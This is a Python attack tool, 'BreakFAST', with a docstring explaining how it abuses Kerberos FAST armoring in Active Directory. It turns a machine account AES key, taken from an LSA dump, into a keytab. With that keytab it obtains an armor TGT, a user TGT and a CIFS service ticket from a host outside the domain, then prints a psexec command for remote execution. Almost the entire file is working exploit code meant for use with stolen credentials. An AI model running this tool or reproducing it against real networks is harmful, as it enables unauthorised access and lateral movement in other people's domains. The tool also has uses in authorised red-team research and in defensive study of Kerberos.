"""
Usage: 
------
    
    ./BreakFAST.py -aesKey <armorKey> -machine <armorPrincipal> -outfile <ccache> REALM/user:password

Details:
--------

    This tool demonstrates how to abuse Kerberos FAST armoring. When enabled, the KDC doesnt
    force FAST armoring on machine account AS-REQ. Thus, it is possible to request an armor
    TGT for a given machine principal if the associated long term secret (aesKey) is known. 
    This armor TGT can then be used for armoring TGS-REQ, e.g. CIFS\someHost to get a session 
    from a non domain-joined system, as demonstrated in this tool.  

Prerequisites:
--------------

    BreakFAST takes -aesKey as input, which is obtained by dumping LSA on the armorPrincipal system
    (or the Domain Controller, less likely). You must also know the password or other credential for 
    the user account you wish to impersonate. This script only helps you forge RFC-Compliant FAST.

References:
-----------

    Recover AES-Key:
        https://github.com/fortra/impacket/blob/master/examples/secretsdump.py

    FAST Armoring : 
        https://www.rfc-editor.org/rfc/rfc6113.txt

    Krb5 FAST: 
        https://github.com/jborean93/krb5-fast

    SecretsToKeytab:
        https://github.com/DovidP/generate-keytab/tree/master


Overview:
---------

    1. Convert aesKey to keytab (can be obtained running secretsdump)                    
    2. Build FAST AS-REQ using keytab as armor key, receive machine$ TGT                        
    3. Build FAST AS-REQ for user using machine$ TGT as armor key, receive user TGT
    4. Build FAST TGS-REQ using machine$ TGT for CIFS\fqdn, receive FAST ST for user
    5. Use ST for PsExec    
        
"""

import struct
from time import time
from dataclasses import astuple, dataclass
import argparse
import sys

from impacket.examples.utils import parse_identity 

import copy
import krb5
import gssapi
import gssapi.raw


def data_bytes(data):
    return struct.pack(f'>h{len(data)}s', len(data), bytes(data, 'ascii'))

@dataclass
class Principal:
    count_of_components: int = 1
    realm: bytes = None
    component: bytes = None
    name_type: int = 1

    def packed(self):
        return struct.pack(f'>h{len(self.realm)}s{len(self.component)}sl', *astuple(self))


@dataclass
class Entry:
    principal: bytes = None
    timestamp: int = int(time())
    key_version1: int = 1
    enctype: int = None
    key_length: int = None
    key_contents: bytes = None
    key_version2: int = 1

    def packed(self):
        packed_entry = struct.pack(f'>{len(self.principal)}sibhh{self.key_length}sl', *astuple(self))
        return struct.pack('>l{}s'.format(len(packed_entry)), len(packed_entry), packed_entry)


def ConvertAesKeyToKeyTab(machine, key, realm, outfile):
    etype = 18 # todo: add other formats, see refs.
    key = bytes.fromhex(key)
    principal = Principal(realm = data_bytes(realm), component = data_bytes(machine))
    entry = Entry()
    entry.principal = principal.packed()
    entry.enctype = etype
    entry.key_length = len(key)
    entry.key_contents = key
    version = b'\x05\x02'
    with open(outfile, 'wb') as f:
        f.write(version)
    with open(outfile, 'ab') as f:
        f.write(entry.packed())
    
    print('\n'+"---"*10)
    print(f"[*] Keytab save to: {outfile}")

def GetFASTArmor(outfile, realm, username, passw):
    ctx = krb5.init_context()
    armour_kt = krb5.kt_resolve(ctx, outfile.encode('utf-8'))
    armour_kt_entry = list(armour_kt)[0]
    armour_princ = copy.copy(armour_kt_entry.principal)
    init_opt = krb5.get_init_creds_opt_alloc(ctx)
    armour_cred = krb5.get_init_creds_keytab(ctx, armour_princ, init_opt, keytab=armour_kt)
    armour_cc = krb5.cc_new_unique(ctx, b"MEMORY")
    krb5.cc_initialize(ctx, armour_cc, armour_princ)
    krb5.cc_store_cred(ctx, armour_cc, armour_cred)
    s = username+"@"+realm.upper()
    princ = krb5.parse_name_flags(ctx, s.encode('utf-8'))
    init_opt = krb5.get_init_creds_opt_alloc(ctx)
    krb5.get_init_creds_opt_set_canonicalize(init_opt, True)
    krb5.get_init_creds_opt_set_fast_flags(ctx, init_opt, krb5.FastFlags.required)
    krb5.get_init_creds_opt_set_fast_ccache(ctx, init_opt, armour_cc)
    cred = krb5.get_init_creds_password(ctx, princ, init_opt, password=passw.encode('utf-8'))
    
    print(f"[*] Received FAST TGT")
    file_ccache = krb5.cc_resolve(ctx, b"FILE:BreakFAST.ccache")
    krb5.cc_initialize(ctx, file_ccache, princ)
    krb5.cc_store_cred(ctx, file_ccache, cred)
    print("[*] Saved credential cache to BreakFAST.ccache")
    return file_ccache


def GetFASTSt(realm, username, file_ccache, machine):
    kerberos = gssapi.OID.from_int_seq("1.2.840.113554.1.2.2")
    s = username+"@"+realm.upper()
    kerb_user = gssapi.Name(s, name_type=gssapi.NameType.user)
    ccache_name = file_ccache.name or b""
    if file_ccache.cache_type:
        ccache_name = file_ccache.cache_type + b":" + ccache_name
    gssapi_cred = gssapi.raw.acquire_cred_from(
        {b"ccache": ccache_name},
        name=kerb_user,
        mechs=[kerberos],
        usage="initiate",
    ).creds
    spn = "cifs@"+machine[:-1]+'.'+realm.lower()
    cifs_ctx = gssapi.SecurityContext(
        creds=gssapi_cred,
        usage="initiate",
        name=gssapi.Name(spn, name_type=gssapi.NameType.hostbased_service),
        mech=kerberos,
    )
    token = cifs_ctx.step()


def main():

    parser = argparse.ArgumentParser(description="BreakFAST - Forge FAST Armoring AS-REQ/TGS-REQs")
    parser.add_argument("-aesKey", help="aes256-cts-hmac-sha1-96 key for machine account", required=True)
    parser.add_argument("-machine", help="machine account for armor TGT", required=True)
    parser.add_argument("-outfile", help=".ccache file to save FAST TGT/FAST ST", required=True)
    parser.add_argument('identity', help='REALM/username[:password]')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()
    aeskey = args.aesKey
    machine = args.machine

    if machine[-1] != "$":
        machine += "$"

    outfile = args.outfile
    realm, username, password, _, _, _ = parse_identity(args.identity)

    # 1. Generate Keytab using provided key
    ConvertAesKeyToKeyTab(machine, aeskey, realm, outfile)

    # 2. Generate Armor and get ST   
    fast_ccache = GetFASTArmor(outfile, realm, username, password)

    # 3. Get FAST ST for CIFS
    GetFASTSt(realm, username, fast_ccache, machine)

    # 4. Do whatever with this, PsExec ?
    print("---"*10)
    print("[*] Next Steps:\n")
    print("\t export KRB5CCNAME=BreakFAST.ccache")
    print(f"\t psexec.py -dc-ip 1.2.3.4 -k -no-pass {realm}/{username}@{machine[:-1]}.{realm.upper()}") 
    print("---"*10+'\n')

if __name__ == '__main__':
    main()
